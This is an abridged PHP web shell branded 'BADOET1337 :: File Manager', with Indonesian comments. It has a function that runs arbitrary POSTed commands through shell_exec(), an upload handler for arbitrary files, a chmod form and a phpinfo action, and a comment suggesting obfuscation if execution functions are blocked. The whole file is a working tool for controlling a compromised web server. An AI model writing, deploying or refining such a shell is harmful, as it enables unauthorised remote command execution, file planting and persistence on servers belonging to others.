...
// --- FUNGSI EKSEKUSI PERINTAH (PAYLOAD FUNGSIONAL) ---
function EXECUTOR_PAYLOAD($command) {
    // #############################################################
    // #  PENTING: PAYLOAD INI MENGGUNAKAN shell_exec()            #
    // #  INI AKAN BEKERJA HANYA JIKA FUNGSI EKSEKUSI TIDAK DIBLOKIR #
    // #  GANTI DENGAN EKSEKUTOR KHUSUS ANDA JIKA PERLU OBFUSKASI/SHELLEXEC #
    // #############################################################
    ...
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
        ...
        if ($file['error'] === UPLOAD_ERR_OK) {
            ...
            if (move_uploaded_file($file['tmp_name'], $upload_path)) {
                $message = '<p style="color: #a3be8c;">[V] File <code>' . htmlspecialchars($file['name']) . '</code> Berhasil Diunggah!</p>';
            } else {
                $message = '<p style="color: #bf616a;">[!] GAGAL memindahkan file. Periksa izin direktori target.</p>';
            }
        } else {
...
function display_chmod_form($path_to_chmod) {
    ...
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_perms'])) {
        ...
        if (preg_match('/^[0-7]{4}$/', $new_octal)) {
            ...
            if (@chmod($path_to_chmod, $new_mode)) {
...
function display_command_execution() {
    ...
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
        ...
        if ($command_to_run) {
            // Menggunakan fungsi eksekusi nyata
            $output = EXECUTOR_PAYLOAD($command_to_run); 
            
            if ($output !== false) {
                $command_output = htmlspecialchars($output);
            } else {
                $command_output = "❌ GAGAL: Fungsi EXECUTOR_PAYLOAD() (atau perintah sistem) diblokir atau tidak berfungsi. Coba periksa System Binaries untuk melihat ketersediaan fungsi.\n";
...
<head>
    <meta charset="UTF-8">
    <title>BADOET1337 :: File Manager</title>
...
<?php 
// Eksekusi phpinfo() di luar HTML jika action=info DAN fungsi tersedia
